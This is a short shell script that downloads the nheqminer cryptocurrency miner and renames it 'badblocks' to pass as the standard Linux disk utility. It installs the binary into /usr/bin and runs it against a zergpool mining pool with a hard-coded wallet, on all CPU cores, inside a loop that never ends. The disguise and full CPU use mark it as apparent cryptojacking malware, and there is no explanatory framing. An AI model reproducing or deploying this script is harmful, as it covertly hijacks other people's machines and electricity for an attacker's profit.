#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvzf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
mv nheqminer badblocks
mv badblocks /usr/bin
badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-DUIT) -p c=DGB -t $(nproc --all)
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
